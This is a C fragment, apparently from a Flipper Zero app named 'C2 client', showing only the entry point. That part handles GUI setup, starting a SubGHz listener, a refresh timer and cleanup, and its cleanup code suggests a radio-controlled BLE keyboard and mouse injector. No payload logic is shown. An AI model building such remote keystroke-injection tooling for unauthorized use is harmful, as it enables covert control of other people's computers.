/* ---------- Entry point ------------------------------------------------- */

int32_t c2_client_app(void* p) {
    UNUSED(p);

    C2ClientApp* app = malloc(sizeof(C2ClientApp));
    furi_check(app);
    memset(app, 0, sizeof(C2ClientApp));

    app->frequency = C2_FREQ_DEFAULT;
    app->running = true;

    app->gui = furi_record_open(RECORD_GUI);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    /* Set up GUI first so radio errors are shown on-screen */
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, custom_event_cb);
    view_dispatcher_attach_to_gui(
        app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    app->status_view = view_alloc();
    view_allocate_model(app->status_view, ViewModelTypeLockFree, sizeof(C2ClientApp*));
    with_view_model(app->status_view, C2ClientApp** model, { *model = app; }, false);
    view_set_draw_callback(app->status_view, draw_status);
    view_set_input_callback(app->status_view, input_status);
    view_set_context(app->status_view, app);

    view_dispatcher_add_view(app->view_dispatcher, ViewIdStatus, app->status_view);
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewIdStatus);

    /* Start SubGHz radio — start_radio() sets error_msg on failure so the
     * screen shows a specific reason instead of silently exiting. */
    if(!start_radio(app)) {
        FURI_LOG_E(TAG, "Radio init failed (%s) — showing error screen", app->error_msg);
    } else {
        snprintf(app->last_cmd, sizeof(app->last_cmd), "Listening...");
        FURI_LOG_I(
            TAG,
            "C2 client ready at %lu.%03lu MHz",
            (unsigned long)(app->frequency / 1000000UL),
            (unsigned long)((app->frequency % 1000000UL) / 1000UL));
    }

    /* 500 ms periodic refresh so counters/state update without button presses */
    app->refresh_timer = furi_timer_alloc(refresh_timer_cb, FuriTimerTypePeriodic, app);
    furi_timer_start(app->refresh_timer, 500);

    /* Run until back button pressed */
    view_dispatcher_run(app->view_dispatcher);

    /* Cleanup */
    furi_timer_stop(app->refresh_timer);
    furi_timer_free(app->refresh_timer);

    view_dispatcher_remove_view(app->view_dispatcher, ViewIdStatus);
    view_free(app->status_view);
    view_dispatcher_free(app->view_dispatcher);

    /* Stop BLE HID if active */
    if(app->ble_hid_profile) {
        ble_profile_hid_kb_release_all(app->ble_hid_profile);
        ble_profile_hid_mouse_release_all(app->ble_hid_profile);
        if(app->bt_held) {
            bt_profile_restore_default(app->bt_held);
            furi_record_close(RECORD_BT);
        }
    }

    /* Stop beacon if active */
    if(furi_hal_bt_extra_beacon_is_active()) {
        furi_hal_bt_extra_beacon_stop();
    }

    if(app->radio_active) {
        stop_radio(app);
    }

    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    free(app);

    return 0;
}
